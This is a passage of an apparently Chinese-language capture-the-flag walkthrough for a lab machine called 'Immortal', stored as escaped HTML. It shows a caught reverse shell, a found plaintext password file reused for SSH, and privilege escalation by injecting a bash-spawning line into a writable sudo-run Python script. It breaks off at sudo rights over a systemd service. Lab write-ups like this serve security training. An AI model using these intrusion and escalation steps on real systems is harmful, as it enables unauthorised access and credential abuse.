34            \u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ..\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问上传的文件后，获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e            \nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.15\u003c/span\u003e: inverse host lookup failed: Host name lookup failure\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e50024\u003c/span\u003e\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (\u003cspan class=\"hljs-number\"\u003e458\u003c/span\u003e): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nwww-data@Immortal:/var/www/html/longlife17/chat$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e靶机信息收集\u003c/h3\u003e\n\u003cp\u003e上传\u003ccode\u003elinpeas.sh\u003c/code\u003e信息收集，发现许多有趣的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e╔══════════╣ All relevant hidden files (\u003cspan class=\"hljs-keyword\"\u003e n\u003e a good idea, although I\u003cspan class=\"hljs-string\"\u003e'm sad to tell him, he'\u003c/span\u003es so excited about it\n\u003cspan class=\"hljs-comment\"\u003e## 我想我应该告诉大卫，永生不是什么好主意，尽管我很伤心地告诉他，他对此很兴奋\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/opt\u003c/code\u003e下的\u003ccode\u003eimmortal.txt\u003c/code\u003e 和 \u003ccode\u003eimmortal.py\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@Immortal:/opt$ cat immortal.txt\nEvery man dies. Not every man lives\n\u003cspan class=\"hljs-comment\"\u003e## 每个人都会死，但不是每个人都能活\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@Immortal:/opt$ cat immortal.py\na = \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003estr\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Do you want to be immortal: \"\u003c/span\u003e))\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e a.lower() == \u003cspan class=\"hljs-string\"\u003e\"yes\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e a.lower() == \u003cspan class=\"hljs-string\"\u003e\"no\"\u003c/span\u003e:\n   \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Bad answer\"\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n   \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Are you sure?\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e好像并没有用，不过发现对\u003ccode\u003eimmortal.py\u003c/code\u003e我们拥有修改权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@Immortal:/opt$ ls -al\ndrwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e .\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e ..\n-rw-rw-rw-  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e147\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e immortal.py\n-rw-r--r--  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root   \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e immortal.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e/home/drake/.../pass.txt\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e看着像是密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@Immortal:/opt$ cat /home/drake/.../\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e.txt\nnetflix : drake123\namazon : 123drake\nshelldred : shell123dred (f4ns0nly)\nsystem : kevcjnsgii\nbank : myfavouritebank\nnintendo : \u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试使用\u003ccode\u003eSSH\u003c/code\u003e登录，使用\u003ccode\u003esystem\u003c/code\u003e的密码，登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/Immortal]\n└─\u003cspan class=\"hljs-comment\"\u003e# ssh drake@192.168.56.15\u003c/span\u003e\ndrake@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.15\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password: \nLinux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Feb 29 18:55:43 2024 from 10.0.2.15\ndrake@Immortal:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e提权 - Eric\u003c/h3\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edrake@Immortal:/opt$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e drake on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser drake may run the following commands on Immortal:\n    (eric) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3 /opt/immortal.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将\u003ccode\u003epython\u003c/code\u003e文件修改，将提权语句写进去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e os; os.system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -i\"\u003c/span\u003e)\na = \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003estr\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Do you want to be immortal: \"\u003c/span\u003e))\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e a.lower() == \u003cspan class=\"hljs-string\"\u003e\"yes\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e a.lower() == \u003cspan class=\"hljs-string\"\u003e\"no\"\u003c/span\u003e:\n   \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Bad answer\"\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n   \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Are you sure?\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后运行文件，获得\u003ccode\u003eeric\u003c/code\u003e用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edrake@Immortal:/opt$ sudo -u eric /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3 /opt/immortal.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权 - Root\u003c/h3\u003e\n\u003cp\u003e再次查看权限，可以已\u003ccode\u003eroot\u003c/code\u003e权限运行\u003ccode\u003eImmortal\u003c/code\u003e 服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eeric@Immortal:/opt$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e eric on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser eric may run the following commands on Immortal:\n    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\n    (root) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/systemctl start immortal.service\n    (root) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/systemctl stop immortal.service\n    (root) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/systemctl enable immortal.service\n    (root) NOPASSW
